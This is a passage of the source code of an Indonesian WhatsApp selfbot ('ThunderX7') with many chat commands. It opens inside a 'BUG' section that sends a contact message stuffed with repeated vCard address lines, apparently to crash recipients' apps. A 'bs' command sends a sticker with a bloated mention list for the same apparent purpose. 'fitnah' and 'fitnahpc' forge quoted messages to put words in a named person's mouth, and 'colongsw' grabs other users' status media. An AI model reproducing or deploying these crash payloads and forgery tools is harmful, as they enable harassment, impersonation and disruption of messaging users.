7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}, {"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:thunderx7;;;\nFN:thunderx7\nitem1.TEL;waid=0:+0\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}], "contextInfo": {"forwardingScore": 1, "isForwarded": true}}}, {quoted:thunder, contextInfo:{}}) 
                thunderx7.relayWAMessage(res)}
                break
	//******************* 》BUG《 ********************\\
case 'owner':
kontolo = `
Source Code
https://github.com/TheGetsuzoThunder/ThunderX7BotWa

Instagram
https://instagram.com/thunderx.7

Yt
https://youtube.com/c/ThunderX7%E3%81%B907`
thunderx7.sendMessage(from, `${kontolo}`, text, {quoted: thunder})
break
case 'detikvn':
encmediam = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await thunderx7.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						thunderx7.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:thunder})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await thunderx7.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						thunderx7.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: thunder})
						fs.unlinkSync(median)
				break
case 'anticall':
if (!isOwner && !thunder.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (antical === true) return
antical = true
reply(`Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if (antical === false) return
antical = false
reply(`Succes mematikan anticall`)
} else {
reply(`Pilih on atau off`)
}
break
case 'fakevn':
if (!isOwner && !thunder.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (fakevn === true) return
fakevn = true
reply(`Succes mengaktifkan fakevn`)
} else if (args[0] === "off") {
if (fakevn === false) return
fakevn = false
reply(`Succes mematikan fakevn`)
} else {
reply(`Pilih on atau off`)
}
break
case 'faketyping':
if (!isOwner && !thunder.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (faketyping === true) return
faketyping = true
reply(`Succes mengaktifkan faketyping`)
} else if (args[0] === "off") {
if (faketyping === false) return
faketyping = false
reply(`Succes mematikan faketyping`)
} else {
reply(`Pilih on atau off`)
}
break
// Auto Read
case 'autoread':
if (!isOwner && !thunder.key.fromMe) return
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readG === true) return
readG = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readG === false) return
readG = false
reply(`Succes mematikan autoread group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readP === true) return
readP = true
reply(`Succes mengaktifkan autoread pribadi`)
} else if (args[1] === "off") {
if (readP === false) return
readP = false
reply(`Succes mematikan autoread pribadi`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
case 'help':
case 'menu':             
const rows = [
 {title: '𝑆𝑡𝑎𝑡𝑢𝑠 𖣂', rowId:"𝑆𝑡𝑎𝑡𝑢𝑠 𖣂"},
 {title: '𝐵𝑢𝑔 𖣂', rowId:"𝐵𝑢𝑔 𖣂"},
 {title: '𝑂𝑤𝑛𝑒𝑟 𖣂', rowId:"𝑂𝑤𝑛𝑒𝑟 𖣂"},
 {title: '𝑀𝑎𝑘𝑒𝑟 𖣂', rowId:"𝑀𝑎𝑘𝑒𝑟 𖣂"},
 {title: '𝐺𝑟𝑜𝑢𝑝 𖣂', rowId:"𝐺𝑟𝑜𝑢𝑝 𖣂"},
 {title: '𝐶𝑜𝑛𝑣𝑒𝑟𝑡 𖣂', rowId:"𝐶𝑜𝑛𝑣𝑒𝑟𝑡 𖣂"},
 {title: '𝐴𝑢𝑑𝑖𝑜 𖣂', rowId:"𝐴𝑢𝑑𝑖𝑜 𖣂"},
 {title: '𝑆𝑡𝑜𝑟𝑎𝑔𝑒 𖣂', rowId:"𝑆𝑡𝑜𝑟𝑎𝑔𝑒 𖣂"},
 {title: '𝑈𝑝𝑠𝑤 𖣂', rowId:"𝑈??𝑠𝑤 𖣂"},
 {title: '𝐴𝑛𝑖𝑚𝑒 𖣂', rowId:"𝐴𝑛𝑖𝑚𝑒 𖣂"},
 {title: '𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑𝑠 𖣂', rowId:"𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑𝑠 𖣂"},
 {title: '𝑆𝑒𝑎𝑟𝑐ℎ 𖣂', rowId:"𝑆𝑒𝑎𝑟𝑐ℎ 𖣂"},
 {title: '𝑂𝑡ℎ𝑒𝑟 𖣂', rowId:"𝑂𝑡ℎ𝑒𝑟 𖣂"},
 {title: '𝐴𝑏𝑜𝑢𝑡 𖣂', rowId:"𝐴𝑏𝑜𝑢𝑡 𖣂"},
 {title: '𝐷𝑒𝑣𝑒𝑙𝑜𝑝𝑒𝑟 𖣂', rowId:"𝐷𝑒𝑣𝑒𝑙𝑜𝑝𝑒𝑟 𖣂"},
]
run = process.uptime() 
teks = `${kyun(run)}`
anunder = await thunderx7.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
anundergc = await thunderx7.chats.all().filter(v => v.jid.endsWith('g.us'))
const sections = [{title: "𝐵𝑦 𝑇ℎ𝑢𝑛𝑑𝑒𝑟 𝑋7", rows: rows}]
desk = `𝐓𝐡𝐢𝐬 𝐈𝐬 𝐀 𝐌𝐞𝐧𝐮

༑ 𝐁𝐲 𝐭𝐡𝐮𝐧𝐝𝐞𝐫 𝐗7 ༑
⟠`
const buttonan = {
 buttonText: '⿻ 𝑍𝑁𝑋 𝐶𝑂𝑅𝑃𝑂𝑅𝐴𝑇𝐼𝑂𝑁 ⿻',
 title: `❄️ [[ ༑ 𝐙𝗻𝐗 ⿻ 𝐢𝐍𝐕𝚫͢𝐒𝐢𝚯͢𝐍 ༑ ]] ❄️\n\n𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬: ${anunder.length}\n𝐆𝐫𝐨𝐮𝐩𝐬: ${anundergc.length}\n𝐅𝐚𝐤𝐞 𝐕𝐍: ${fakevn ? '𝐎𝐧' : '𝐎𝐟𝐟'}`,
 description: latx.menu(pushname, sender, prefix, banChats, ucapanWaktu, timeWib, timeWit, timeWita),
 sections: sections,
 listType: 1
}
thunderx7.sendMessage(from, buttonan, MessageType.listMessage)
break
    case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
case 'sfiledl':
        var uchi = args.join("")
        var link = uchi.split("|")[0]
        var tipe = uchi.split("|")[1]
        bv = await fetchJson(
          `https://api.lolhuman.xyz/api/sfile?apikey=YTRAMLANID&url=${link}`
        )
        bv = bv.result
        jadi = await getBuffer(bv.link)
        if (tipe == "apk") {
        thunderx7.sendMessage(from, jadi, document, { quoted: thunder, mimetype: 'document/application', filename: `${bv.title}.apk` })
                                                        
        }          
       break
case 'sfile':
      case 'sf':
      try {
				chatt = await await thunderx7.getProfilePicture(sender)
				} catch {
				chatt = 'https://l.top4top.io/p_20670hd6v1.jpg'
				}
			let bgf = await getBuffer(chatt)
      
          if (!isUrl(args[0]) && !args[0].includes("sfile"))
         return reply(mess.Iv);
         var bv = await fetchJson(
          `https://api.lolhuman.xyz/api/sfile?apikey=YTRAMLANID&url=${args[0]}`, {method: 'get'}
          );
         var b = bv.result;
         var size = b.filesize;
         var apk = b.link;
         
         tombol = [
              {
              buttonId: `${prefix}sfiledl ${args[0]}|apk`,
              buttonText: {
                displayText: `SEND APK`,
              },
              type: 1,
            },
          { buttonId: `${prefix}Dukung`, buttonText: { displayText: "📌SUBSCRIBE📌" }, type: 1 },
        ];
        imageMsg = (
          await thunderx7.prepareMessageMedia(bgf, "imageMessage", {
            thumbnail: bgf,
          })
        ).imageMessage;
        buttonsMessage = {
          contentText: `Judul:  ${b.title} \n\n Size : ${b.size}\n\nDownload : ${apk}`,
          footerText: "pencet linknya ",
          imageMessage: imageMsg,
          buttons: tombol,
          headerType: 4,
        }
        prep = await thunderx7.prepareMessageFromContent(
          from,
          { buttonsMessage },
          {quoted: thunder}
        )
        thunderx7.relayWAMessage(prep)
        
      break;
    case 'igstory': 
            if(!q) return reply('Usernamenya?')
            if(!q && !q[0].includes('@')) return reply('Gausah pake @') 
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    thunderx7.sendMessage(from,link,video,{quoted: thunder,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    thunderx7.sendMessage(from,link,image,{quoted: thunder,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await thunderx7.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await thunderx7.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
    case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            thunderx7.sendMessage(from,ram,image,{quoted:thunder,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
    case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await thunderx7.sendMessage(from,li,image,{quoted: thunder})
            break
case 'darkjokes':
reply('Lagi proses')
					data = fs.readFileSync('./lib/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					thunderx7.sendMessage(from, hasil, image, {quoted: ftroli, caption: 'PRIMIRIP'})
				break
    case 'pinterest':
        
            if(!q) return reply('gambar apa?')
            reply('Lagi proses')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await thunderx7.sendMessage(from,di,image,{quoted: thunder})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *thunder* : ${i.thundereloper}
- *Link thunder* : ${i.link_thunder}\n❉─────────────────────❉`
            }
            reply(store)
            break
    case 'on':
            if (!thunder.key.fromMe && !isOwner) return 
            offline = false
            fakestatus(' ```ANDA TELAH ONLINE``` ')
            break   
case 'wakelock':
            thunderx7.sendMessage(from, `$ termux-wake-lock`,text)
            reply(`sukses sekarang bot tidak akan terputus koneksi baileys`)
            break       
            case 'unwakelock':
            thunderx7.sendMessage(from, `$ termux-wake-unlock`,text)
            reply(`sukses`)
            break       
    case 'status':
            reply(`𝐒𝐭𝐚𝐭𝐮𝐬\n${offline ? '• 𝐎𝐟??𝐥𝐢𝐧𝐞' : '• 𝐎𝐧𝐥𝐢𝐧𝐞'}\n${banChats ? '• ??𝐄𝐋𝐅 𝐌𝐎𝐃𝐄' : '• 𝐏𝐔𝐁𝐋𝐈𝐂 𝐌𝐎𝐃𝐄'}`)
            break
    case 'off':
            if (!thunder.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            fakestatus(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'inspectweb':
    reply('Gunakan format https://')
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
case 'colongsw':
        if (!thunder.key.fromMe) return;
        if ((isMedia && !thunderx7.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(thunder).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : thunder
          owgi = await thunderx7.downloadAndSaveMediaMessage(ger);
          thunderx7.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses")
          fs.unlinkSync(owgi)
        } else if ((isMedia && !thunderx7.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(thunder).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : thunder
          owgi = await thunderx7.downloadAndSaveMediaMessage(ger);
          thunderx7.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses")
          fs.unlinkSync(owgi)
        } else {
          reply("Reply sw foto / video yg mau dicolong")
        }
        break
case 'antitoxic':
					if (!isGroup) return reply('Kusus group')
					if (!isGroupAdmins) return reply('Kusus admin')
					if (!isBotGroupAdmins) return reply('Bot jadiin admin dlu')
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antitoxic 1`)
					if (Number(args[0]) === 1) {
						if (isToxic) return reply('Sudah Aktif thunder')
						antitoxic.push(from)
						fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic))
						reply('_Success mengaktifkan anti toxic digroup ini!_')
					} else if (Number(args[0]) === 0) {
						if (!isToxic) return reply('Sudah Mati ')
						var ini = antitoxic.indexOf(from)
						antitoxic.splice(ini, 1)
						fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic))
						reply('_Success mematikan anti toxic digroup ini!_')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break
					case 'antivirtex':
					if (!isOwner & !thunder.key.fromMe) return reply('Lu siapa?')
if (!isGroup) return reply('Kusus group')
if (!isGroupAdmins) return reply('Kusus admin')
if (!isBotGroupAdmins) return reply('Bot jadiin admin dlu')
if (args.length < 1) return reply('ketik 1 untuk mengaktifkan\nketik 0 untuk menonaktifkan')
if (args[0] === "1") {
if (AntiVirtex) return reply('Sudah Aktif')
antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
reply('_Succes menyalakan antivirtex di group ini_')
} else if (args[0] === "0") {
if (!AntiVirtex) return reply('Sudah Mati')
let off = antivirtex.indexOf(from)
antivirtex.splice(off, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
reply('_Succes mematikan antivirtex di group ini_')
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
case 'autorespon':
      if (!isOwner) return reply('ANDA BUKAN OWNER')
       if (args.length < 1) return reply(`Penggunaan ${prefix}autorespon on/off`)
           if (q === 'on'){
              autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (q === 'off'){
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else {
                    reply('error')
                }
                break
case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner & !thunder.key.fromMe & !isGroupAdmins) return reply(mess.admin)
					if (!isBotGroupAdmins) return reply(mess.badmin)
					if (args.length < 1) return reply('Pake nomer')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara contohnya 62')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						thunderx7.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
					case 'kick':
					if (!isOwner && !thunder.key.fromMe) return reply('lu siapa?')
			if (!isGroupAdmins) return reply('anda bukan admin')
			if (!isBotGroupAdmins) return reply('Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Ini')
				if (!q) return reply(`Penggunaan ${prefix}kick @tag atau nomor`)
				if (thunder.message.extendedTextMessage != undefined){
                    mentionednya = thunder.message.extendedTextMessage.contextInfo.mentionedJid
					await reply(`Bye...`)
					thunderx7.groupRemove(from, mentionednya)
				} else {
					await reply(`Bye...`)
					thunderx7.kick(from, [args[0] + '@s.whatsapp.net'])
				}
				break
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
linkgc = await thunderx7.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\nNih`
thunderx7.sendMessage(from, yeh, text, { quoted: thunder })
break

case 'group':
if (!thunder.key.fromMe) return reply('Lu siapa')
if (!isGroupAdmins) return reply('No admin mek')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
if (args[0] === 'open') {
thunderx7.groupSettingChange(from, GroupSettingChange.messageSend, false)
reply(`Sukses membuka akses grup ${groupName}`)
} else if (args[0] === 'close') {
thunderx7.groupSettingChange(from, GroupSettingChange.messageSend, true)
reply(`Sukses menutup akses ${groupName}`)
}
break

case 'setdesc':
if (!thunder.key.fromMe) return reply('Lu siapa')
if (!isGroupAdmins) return reply('No admin mek')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
thunderx7.groupUpdateDescription(from, `${args.join(" ")}`)
break

case 'setname':
if (!thunder.key.fromMe) return reply('Lu siapa')
if (!isGroupAdmins) return reply('No admin mek')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
thunderx7.groupUpdateSubject(from, `${args.join(" ")}`)
thunderx7.sendMessage(from, 'Succes change name group', text, {quoted:thunder})
break

case 'demote':
					if (!thunder.key.fromMe && !isOwner) return reply('Lu siapa')
if (!isGroupAdmins) return reply('No admin mek')
					if (!isGroup)
					if (thunder.message.extendedTextMessage === undefined || thunder.message.extendedTextMessage === null) return reply('Tag target!')
					mentionedkena = thunder.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentionedkena.length > 1) {
						teks = 'Mengadmin :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentionedkena, true)
						thunderx7.groupDemoteAdmin(from, mentionedkena)
					} else {
						mentions(`Membaca status @${mentionedkena[0].split('@')[0]}`, mentionedkena, true)
						thunderx7.groupDemoteAdmin(from, mentionedkena)
						reply(`Sukses membuang akses admin @${mentionedkena[0].split('@')[0]}`, mentionedkena, true)
					}
					break
case 'promote':
					if (!thunder.key.fromMe && !isOwner) return reply('Lu siapa')
if (!isGroupAdmins) return reply('No admin mek')
					if (!isGroup)
					if (thunder.message.extendedTextMessage === undefined || thunder.message.extendedTextMessage === null) return reply('Tag target!')
					mentionedkena = thunder.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentionedkena.length > 1) {
						teks = 'ga jadi admin:\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentionedkena, true)
						thunderx7.groupMakeAdmin(from, mentionedkena)
					} else {
						mentions(`Membaca status @${mentionedkena[0].split('@')[0]}`, mentionedkena, true)
						thunderx7.groupMakeAdmin(from, mentionedkena)
						reply(`Sukses memberi akses admin kepada @${mentionedkena[0].split('@')[0]}`, mentionedkena, true)
					}
					break
case 'revoke':
if (!thunder.key.fromMe) return reply('Lu siapa')
if (!isGroupAdmins) return reply('No admin mek')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
thunderx7.revokeInvite(from)
reply('_Success_')
break
    case 'sticktag':
            if (!thunder.key.fromMe && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !thunder.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
case 'bs':
            if (!thunder.key.fromMe && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !thunder.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = [9999999999999999999999999999999]
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            if (!thunder.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !thunder.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !thunder.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !thunder.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !thunder.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : thunder
            file = await thunderx7.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await thunderx7.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: thunder
            }
            ini_buffer = fs.readFileSync(file)
            thunderx7.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'fitnah':
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentionednya = thunder.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            thunderx7.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentionednya}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            reply(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
    if (!thunder.key.fromMe && !isOwner) return reply(mess.owner)
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = thunder.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await thunderx7.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await thunderx7.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return reply('Reply videonya!')
            reply(mess.wait)
            encmedia = JSON.parse(JSON.stringify(thunder).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await thunderx7.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            thunderx7.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: thunder })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
